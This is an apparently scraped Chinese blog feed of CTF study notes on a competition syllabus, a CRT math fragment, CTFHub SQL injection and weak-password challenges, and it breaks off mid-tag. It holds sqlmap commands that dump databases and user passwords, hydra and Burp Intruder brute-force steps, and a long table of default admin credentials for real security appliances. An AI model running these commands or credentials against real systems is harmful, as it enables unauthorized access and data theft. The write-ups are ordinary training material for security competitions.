PWN系统镜像：下载地址 <a href="https://pan.baidu.com/s/1vRCd4bMkqnqqY1nT2uhSYw">https://pan.baidu.com/s/1vRCd4bMkqnqqY1nT2uhSYw</a> 提取码:  5rx6</p></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><blockquote><p>Crypto共计3道题目</p></blockquote><p> 主要考察中国剩余定理（CRT）,RSA 加密,base解密，键盘包围</p><p><strong>性质含义</strong>：这个性质告诉我们，一个数 a 乘以一个数 k 后，再对 b 求余，等同于先求 a 模 b 的余数，再乘以 k，最后再对 b 求余。</p><p>crt</p><p>三三取一,五五取三,七七取五</p><p>k= 1 (mod 3) =&gt; k = -2(mod3) k取模3余1,相当于k取模3余-2</p><p>k = 3(mod5)=&gt;k = -2(mod5)</p><p>k=5(mod7)=&gt;k=-2(mod7)</p><p>3,5,7|k+2 因为k取模3,5,7得余数都为-2,所以k+2可以被3,5,7整除</p><p>=&gt; 3x5x7|k+2</p><p>105|k+2 也就是105被k+2可以整除</p><p>所以k=103 + 103+105+…..  k可以是2+105的倍数</p><script type="math/tex; mode=display">\begin{cases}k\equiv a(3)\\k\equiv b(5)\\k\equiv c(7)\end{cases}\Rightarrow k=ax+by+cz(mod\ 105)</script><script type="math/tex; mode=display">\begin{cases}x\equiv 1(3)\\x\equiv 0(5)\\x\equiv 0(7)\end{cases}\ \ \ \ \ \ \ \ \ \ \ \ \begin{cases}y\equiv 0(3)\\y\equiv 1(5)\\y\equiv 0(7)\end{cases}\ \ \ \ \ \ \ \ \ \ \ \ \begin{cases}z\equiv 0(3)\\z\equiv 0(5)\\z\equiv 1(7)\end{cases}</script><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>比赛内容</title>
      <link href="/2024/11/13/%E6%AF%94%E8%B5%9B%E5%86%85%E5%AE%B9/"/>
      <url>/2024/11/13/%E6%AF%94%E8%B5%9B%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="比赛内容"><a href="#比赛内容" class="headerlink" title="比赛内容"></a>比赛内容</h1><p>一、考核大纲  考核大纲主要包括理论知识考核和实操技能解题，包含 信息安全基础知识、安全法律法规及标准规范、密码学、WEB 安全等7部分内容。明确参赛选手应具备的知识与技能，是大 赛命题及参赛队伍训练准备的参考资料。</p><p>（一）信息安全基础知识  考查选手对信息安全保障、信息安全管理、信息安全支 撑技术、物理与网络通信安全、计算环境安全、软件安全开 发等信息安全基础知识的掌握情况。</p><p>（二）安全法律法规及标准规范   考查选手对《网络安全法》《个人信息安全保护法》《数 据安全法》《关键信息基础设施保护条例》等法律法规的了 解程度。  考查选手对《信息安全风险评估规范》《网络安全等级 保护基本要求》《个人信息安全规范》《关键信息基础设施 安全保护要求》等网络安全标准的了解程度。</p><p>（三）密码学  考查选手对密码学相关知识的掌握情况，包括编码解码、 古典密码学、RSA、AES、DES、SM2、SM4现代密码学算法、量 子密码学等。</p><p>（四）WEB安全  考查选手对WEB应用常见安全风险和网络攻击的掌握程 度，包括通用框架和中间件漏洞、反序列化、<a href="sql注入.md">SQL注入</a>、文件 包含、文件上传、命令执行、权限绕过、弱口令等常见安全 问题，及常用WEB安全检测及对抗技术、漏洞挖掘与利用技术 手段等。</p><p>（五）逆向工程  考查选手对Windows/Linux/Android等平台的二进制代 码的逆向分析和理解能力，主要包括多种反汇编、反编译逆 向工具的使用，脱壳、调试技巧，加解密、反调试和代码混 淆，恶意样本分析等技术。</p><p>（六）PWN  2  考查选手对于二进制漏洞的挖掘和利用能力，包括堆栈 溢出、格式化漏洞等常见二进制漏洞，选手需要分析并发现 程序漏洞，并进行利用。</p><p>（七）威胁检测与网络流量分析  考查选手对恶意代码、程序、流量的识别、检测分析和 还原能力，包括网络流量行为分析、流量还原解密、Web日志 分析、恶意代码痕迹检测，及恶意活动进程行为分析和数据 恢复等。</p><p>二、赛题说明  初赛赛题数量及难度等级如下表所示。</p><p>​<img src="assets/image-20241113132655-b56dpxo.png" alt="image"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数型SQL注入</title>
      <link href="/2024/11/12/%E6%95%B4%E6%95%B0%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/11/12/%E6%95%B4%E6%95%B0%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="整数型SQL注入"><a href="#整数型SQL注入" class="headerlink" title="整数型SQL注入"></a>整数型SQL注入</h1><p>ctfhub{f797878b77751f2aa52c00bd}</p><h4 id="检测注入点"><a href="#检测注入点" class="headerlink" title="检测注入点"></a>检测注入点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1&quot;             //检测过程中需要手动输入y/n，即是否继续进行[sql注入](sql注入.md)检测</span><br><span class="line">sqlmap -u &quot;http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1&quot; --batch     //检测过程中默认继续进行[sql注入](sql注入.md)检测</span><br></pre></td></tr></table></figure><h4 id="产看所有数据库"><a href="#产看所有数据库" class="headerlink" title="产看所有数据库"></a>产看所有数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:--dbs</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:                               </span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sqli</span><br></pre></td></tr></table></figure><h4 id="查看当前网站使用的数据库"><a href="#查看当前网站使用的数据库" class="headerlink" title="查看当前网站使用的数据库"></a>查看当前网站使用的数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1&quot; <span class="comment">--current-db</span></span><br></pre></td></tr></table></figure><h4 id="产看数据表"><a href="#产看数据表" class="headerlink" title="产看数据表"></a>产看<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E8%A1%A8&amp;spm=1001.2101.3001.7020">数据表</a></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1&quot; <span class="operator">-</span>D <span class="string">&#x27;sqli&#x27;</span> <span class="comment">--tables</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli                                         </span><br><span class="line">[2 tables]</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">| news |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><h4 id="查看字段"><a href="#查看字段" class="headerlink" title="查看字段"></a>查看字段</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1&quot; <span class="operator">-</span>D <span class="string">&#x27;sqli&#x27;</span> <span class="operator">-</span>T <span class="string">&#x27;flag&#x27;</span> <span class="comment">--columns</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| flag   | varchar(100) |</span><br><span class="line">+--------+--------------+</span><br></pre></td></tr></table></figure><h4 id="查看字段数据"><a href="#查看字段数据" class="headerlink" title="查看字段数据"></a>查看字段数据</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1&quot;</span> -D <span class="string">&#x27;sqli&#x27;</span> -T <span class="string">&#x27;flag&#x27;</span> --<span class="keyword">dump</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">abase &#x27;sqli&#x27;</span><br><span class="line">Database: sqli&#x27;</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| flag                             |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;4598642ab583bc461923d8c9&#125; |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><h4 id="查看数据库用户"><a href="#查看数据库用户" class="headerlink" title="查看数据库用户"></a><a href="https://so.csdn.net/so/search?q=%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93&amp;spm=1001.2101.3001.7020">查看数据库</a>用户</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1&quot; <span class="comment">--current-user</span></span><br></pre></td></tr></table></figure><h4 id="查看所有用户"><a href="#查看所有用户" class="headerlink" title="查看所有用户"></a>查看所有用户</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u 完整url <span class="comment">--users</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库用户密码"><a href="#获取数据库用户密码" class="headerlink" title="获取数据库用户密码"></a>获取数据库用户密码</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u 完整url <span class="comment">--passwords</span></span><br></pre></td></tr></table></figure><h4 id="查看用户权限"><a href="#查看用户权限" class="headerlink" title="查看用户权限"></a>查看<a href="https://so.csdn.net/so/search?q=%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90&amp;spm=1001.2101.3001.7020">用户权限</a></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u 完整url <span class="comment">--privileges</span></span><br></pre></td></tr></table></figure><h4 id="判断当前数据库用户是否是管理员"><a href="#判断当前数据库用户是否是管理员" class="headerlink" title="判断当前数据库用户是否是管理员"></a>判断当前数据库用户是否是管理员</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 完整url --<span class="keyword">is</span>-dba</span><br></pre></td></tr></table></figure><h3 id="自动化扫描"><a href="#自动化扫描" class="headerlink" title="自动化扫描"></a>自动化扫描</h3><p>将抓到的数据包右键copy to file，然后使用kali注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r <span class="string">&#x27;数据包路径&#x27;</span> <span class="comment">--dbs --batch</span></span><br></pre></td></tr></table></figure><h3 id="批量自动化扫描"><a href="#批量自动化扫描" class="headerlink" title="批量自动化扫描"></a>批量自动化扫描</h3><p>新建xxx.txt文件，里面存放多个url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -m xxx.txt</span><br></pre></td></tr></table></figure><hr><h3 id="post请求注入"><a href="#post请求注入" class="headerlink" title="post请求注入"></a>post请求注入</h3><p>将抓包抓到的http请求内容存放到.txt文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r xxx.txt</span><br></pre></td></tr></table></figure><p>tags: [web渗透]<br>title: 整数型SQL注入<br>title: 整数型SQL注入<br>title: 整数型SQL注入<br>tags: [web渗透]<br>title: 整数型SQL注入</p><h2 id="tags-web渗透"><a href="#tags-web渗透" class="headerlink" title="tags: [web渗透]"></a>tags: [web渗透]</h2><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>一些需要登录的网站在用sqlmap进行注入时，需要添加cookie参数：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 完整curl --cookie <span class="string">&#x27;cookie&#x27;</span>（单引号和双引号都行）</span><br></pre></td></tr></table></figure><p><a href="sql注入.md">sql注入</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>默认口令</title>
      <link href="/2024/11/12/%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"/>
      <url>/2024/11/12/%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h1><h1 id="常见网络安全设备弱口令-默认口令"><a href="#常见网络安全设备弱口令-默认口令" class="headerlink" title="常见网络安全设备弱口令(默认口令)"></a><a href="https://www.cnblogs.com/bflw/p/12938013.html" title="发布于 2020-05-22 16:33">常见网络安全设备弱口令(默认口令)</a></h1><div class="table-container"><table><thead><tr><th>设备</th><th>默认账号</th><th>默认密码</th></tr></thead><tbody><tr><td>深信服产品</td><td>sangfor</td><td>sangfor sangfor@2018 sangfor@2019</td></tr><tr><td>深信服科技 AD</td><td></td><td>dlanrecover</td></tr><tr><td>深信服负载均衡 AD 3.6</td><td>admin</td><td>admin</td></tr><tr><td>深信服WAC ( WNS V2.6)</td><td>admin</td><td>admin</td></tr><tr><td>深信服VPN</td><td>Admin</td><td>Admin</td></tr><tr><td>深信服ipsec-VPN (SSL 5.5)</td><td>Admin</td><td>Admin</td></tr><tr><td>深信服AC6.0</td><td>admin</td><td>admin</td></tr><tr><td>SANGFOR防火墙</td><td>admin</td><td>sangfor</td></tr><tr><td>深信服AF(NGAF V2.2)</td><td>admin</td><td>sangfor</td></tr><tr><td>深信服NGAF下一代应用防火墙(NGAF V4.3)</td><td>admin</td><td>admin</td></tr><tr><td>深信服AD3.9</td><td>admin</td><td>admin</td></tr><tr><td>深信服上网行为管理设备数据中心</td><td>Admin</td><td>密码为空</td></tr><tr><td>SANGFOR_AD_v5.1</td><td>admin</td><td>admin</td></tr><tr><td>网御漏洞扫描系统</td><td>leadsec</td><td>leadsec</td></tr><tr><td>天阗入侵检测与管理系统 V7.0</td><td>Admin</td><td>venus70</td></tr><tr><td></td><td>Audit</td><td>venus70</td></tr><tr><td></td><td>adm</td><td>venus70</td></tr><tr><td>天阗入侵检测与管理系统 V6.0</td><td>Admin</td><td>venus60</td></tr><tr><td></td><td>Audit</td><td>venus60</td></tr><tr><td></td><td>adm</td><td>venus60</td></tr><tr><td>网御WAF集中控制中心(V3.0R5.0)</td><td>admin</td><td>leadsec.waf</td></tr><tr><td></td><td>audit</td><td>leadsec.waf</td></tr><tr><td></td><td>adm</td><td>leadsec.waf</td></tr><tr><td>联想网御</td><td>administrator</td><td>administrator</td></tr><tr><td>网御事件服务器</td><td>admin</td><td>admin123</td></tr><tr><td>联想网御防火墙PowerV</td><td>administrator</td><td>administrator</td></tr><tr><td>联想网御入侵检测系统</td><td>lenovo</td><td>default</td></tr><tr><td>网络卫士入侵检测系统</td><td>admin</td><td>talent</td></tr><tr><td>网御入侵检测系统V3.2.72.0</td><td>adm</td><td>leadsec32</td></tr><tr><td></td><td>admin</td><td>leadsec32</td></tr><tr><td>联想网御入侵检测系统IDS</td><td>root</td><td>111111</td></tr><tr><td></td><td>admin</td><td>admin123</td></tr><tr><td>科来网络回溯分析系统</td><td>csadmin</td><td>colasoft</td></tr><tr><td>中控考勤机web3.0</td><td>administrator</td><td>123456</td></tr><tr><td>H3C iMC</td><td>admin</td><td>admin</td></tr><tr><td>H3C SecPath系列</td><td>admin</td><td>admin</td></tr><tr><td>H3C S5120-SI</td><td>test</td><td>123</td></tr><tr><td>H3C智能管理中心</td><td>admin</td><td>admin</td></tr><tr><td>H3C ER3100</td><td>admin</td><td>adminer3100</td></tr><tr><td>H3C ER3200</td><td>admin</td><td>adminer3200</td></tr><tr><td>H3C ER3260</td><td>admin</td><td>adminer3260</td></tr><tr><td>H3C</td><td>admin</td><td>adminer</td></tr><tr><td></td><td>admin</td><td>admin</td></tr><tr><td></td><td>admin</td><td>h3capadmin</td></tr><tr><td></td><td>h3c</td><td>h3c</td></tr><tr><td>360天擎</td><td>admin</td><td>admin</td></tr><tr><td>网神防火墙</td><td>firewall</td><td>firewall</td></tr><tr><td>天融信防火墙NGFW4000</td><td>superman</td><td>talent</td></tr><tr><td>黑盾防火墙</td><td>admin</td><td>admin</td></tr><tr><td></td><td>rule</td><td>abc123</td></tr><tr><td></td><td>audit</td><td>abc123</td></tr><tr><td>华为防火墙</td><td>telnetuser</td><td>telnetpwd</td></tr><tr><td></td><td>ftpuser</td><td>ftppwd</td></tr><tr><td>方正防火墙</td><td>admin</td><td>admin</td></tr><tr><td>飞塔防火墙</td><td>admin</td><td>密码为空</td></tr><tr><td>Juniper_SSG__5防火墙</td><td>netscreen</td><td>netscreen</td></tr><tr><td>中新金盾硬件防火墙</td><td>admin</td><td>123</td></tr><tr><td>kill防火墙(冠群金辰)</td><td>admin</td><td>sys123</td></tr><tr><td>天清汉马USG防火墙</td><td>admin</td><td>venus.fw</td></tr><tr><td></td><td>Audit</td><td>venus.audit</td></tr><tr><td></td><td>useradmin</td><td>venus.user</td></tr><tr><td>阿姆瑞特防火墙</td><td>admin</td><td>manager</td></tr><tr><td>山石网科</td><td>hillstone</td><td>hillstone</td></tr><tr><td>绿盟安全审计系统</td><td>weboper</td><td>weboper</td></tr><tr><td></td><td>webaudit</td><td>webaudit</td></tr><tr><td></td><td>conadmin</td><td>conadmin</td></tr><tr><td></td><td>admin</td><td>admin</td></tr><tr><td></td><td>shell</td><td>shell</td></tr><tr><td>绿盟产品</td><td></td><td>nsfocus123</td></tr><tr><td>TopAudit日志审计系统</td><td>superman</td><td>talent</td></tr><tr><td>LogBase日志管理综合审计系统</td><td>admin</td><td>safetybase</td></tr><tr><td>网神SecFox运维安全管理与审计系统</td><td>admin</td><td>!1fw@2soc#3vpn</td></tr><tr><td>天融信数据库审计系统</td><td>superman</td><td>telent</td></tr><tr><td>Hillstone安全审计平台</td><td>hillstone</td><td>hillstone</td></tr><tr><td>网康日志中心</td><td>ns25000</td><td>ns25000</td></tr><tr><td>网络安全审计系统（中科新业）</td><td>admin</td><td>123456</td></tr><tr><td>天玥网络安全审计系统</td><td>Admin</td><td>cyberaudit</td></tr><tr><td>明御WEB应用防火墙</td><td>admin</td><td>admin</td></tr><tr><td></td><td>admin</td><td>adminadmin</td></tr><tr><td>明御攻防实验室平台</td><td>root</td><td>123456</td></tr><tr><td>明御安全网关</td><td>admin</td><td>adminadmin</td></tr><tr><td>明御运维审计与册风险控制系统</td><td>admin</td><td>1q2w3e</td></tr><tr><td></td><td>system</td><td>1q2w3e4r</td></tr><tr><td></td><td>auditor</td><td>1q2w3e4r</td></tr><tr><td></td><td>operator</td><td>1q2w3e4r</td></tr><tr><td>明御网站卫士</td><td>sysmanager</td><td>sysmanager888</td></tr><tr><td>亿邮邮件网关</td><td>eyouuser</td><td>eyou_admin</td></tr><tr><td></td><td>eyougw</td><td>admin@(eyou)</td></tr><tr><td></td><td>admin</td><td>+-ccccc</td></tr><tr><td></td><td>admin</td><td>cyouadmin</td></tr><tr><td>Websense邮件安全网关</td><td>administrator</td><td>admin</td></tr><tr><td>梭子鱼邮件存储网关</td><td>admin</td><td>admin</td></tr></tbody></table></div><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>弱口令</title>
      <link href="/2024/11/12/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
      <url>/2024/11/12/%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>​<code>hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt http-get://challenge-1228054484d9886f.sandbox.ctfhub.com:10800/</code>​</p><p>‍</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>开局一个登录框</p><p>​<img src="https://static.ctfhub.com/writeup/Skill/Web/密码口令/弱口令/jWFcTfVt97dV5FBe61vTPy.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt=""><a href="https://static.ctfhub.com/writeup/Skill/Web/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/%E5%BC%B1%E5%8F%A3%E4%BB%A4/jWFcTfVt97dV5FBe61vTPy.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim">https://static.ctfhub.com/writeup/Skill/Web/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/%E5%BC%B1%E5%8F%A3%E4%BB%A4/jWFcTfVt97dV5FBe61vTPy.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim</a></p><p>什么是弱口令？题目里已经给出来了</p><blockquote><p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p></blockquote><p>介绍一下<code>BurpSuite</code>​中<code>Intruder</code>​模块 ，即暴力破解模块(或在fuzz中使用)</p><p>开启burp代理</p><p>登录信息随便填，抓到request请求如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-fe021f0b3f1f8564.sandbox.ctfhub.com:10080</span><br><span class="line">Content-Length: 35</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://challenge-fe021f0b3f1f8564.sandbox.ctfhub.com:10080</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://challenge-fe021f0b3f1f8564.sandbox.ctfhub.com:10080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">name=admin&amp;password=123123&amp;referer=</span><br></pre></td></tr></table></figure><p>右键 <code>send to intruder</code>​ /快捷键<code>CTRL+I</code>​发送到intruder中</p><p>像这种咱们既不知道账号又不知道密码的情况下可以使用交差爆破（<code>cluster bomb</code>​）</p><h3 id="Burp-Suite-Intruder的4种攻击类型"><a href="#Burp-Suite-Intruder的4种攻击类型" class="headerlink" title="Burp Suite Intruder的4种攻击类型"></a>Burp Suite Intruder的4种攻击类型</h3><h4 id="一-Sniper（狙击手模式）"><a href="#一-Sniper（狙击手模式）" class="headerlink" title="一 Sniper（狙击手模式）"></a><strong>一 Sniper（狙击手模式）</strong></h4><p>狙击手模式使用一组payload集合，它一次只使用一个payload位置，假设你标记了两个位置“A”和“B”，payload值为“1”和“2”，那么它攻击会形成以下组合（除原始数据外）：</p><div class="table-container"><table><thead><tr><th>attack NO.</th><th>location A</th><th>location B</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>no replace</td></tr><tr><td>2</td><td>2</td><td>no replace</td></tr><tr><td>3</td><td>no replace</td><td>1</td></tr><tr><td>4</td><td>no replace</td><td>2</td></tr></tbody></table></div><h4 id="二Battering-ram（攻城锤模式）"><a href="#二Battering-ram（攻城锤模式）" class="headerlink" title="二Battering ram（攻城锤模式）"></a><strong>二Battering ram（攻城锤模式）</strong></h4><p>攻城锤模式与狙击手模式类似的地方是，同样只使用一个payload集合，不同的地方在于每次攻击都是替换所有payload标记位置，而狙击手模式每次只能替换一个payload标记位置。</p><div class="table-container"><table><thead><tr><th>attack NO.</th><th>location A</th><th>location B</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td></tr><tr><td>2</td><td>2</td><td>2</td></tr></tbody></table></div><h4 id="三Pitchfork（草叉模式）"><a href="#三Pitchfork（草叉模式）" class="headerlink" title="三Pitchfork（草叉模式）"></a><strong>三Pitchfork（草叉模式）</strong></h4><p>草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，则攻击模式如下：</p><div class="table-container"><table><thead><tr><th>attack NO.</th><th>location A</th><th>location B</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>3</td></tr><tr><td>2</td><td>2</td><td>4</td></tr></tbody></table></div><h4 id="四Cluster-bomb（集束炸弹模式）"><a href="#四Cluster-bomb（集束炸弹模式）" class="headerlink" title="四Cluster bomb（集束炸弹模式）"></a><strong>四Cluster bomb（集束炸弹模式）</strong></h4><p>集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除baseline请求外，会有四次请求：</p><div class="table-container"><table><thead><tr><th>attack NO.</th><th>location A</th><th>location B</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>3</td></tr><tr><td>2</td><td>1</td><td>4</td></tr><tr><td>3</td><td>2</td><td>3</td></tr><tr><td>4</td><td>2</td><td>4</td></tr></tbody></table></div><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>在Payload中导入字典</p><p>如 用户名字典为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">ctfhub</span><br></pre></td></tr></table></figure><p>​<img src="https://static.ctfhub.com/writeup/Skill/Web/密码口令/弱口令/pJdEheCwCiC9ugmfhEZzNH.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt=""><a href="https://static.ctfhub.com/writeup/Skill/Web/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/%E5%BC%B1%E5%8F%A3%E4%BB%A4/pJdEheCwCiC9ugmfhEZzNH.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim">https://static.ctfhub.com/writeup/Skill/Web/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/%E5%BC%B1%E5%8F%A3%E4%BB%A4/pJdEheCwCiC9ugmfhEZzNH.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim</a></p><p>密码字典随便常用密码，点击右上角start attack开始攻击</p><p>​<img 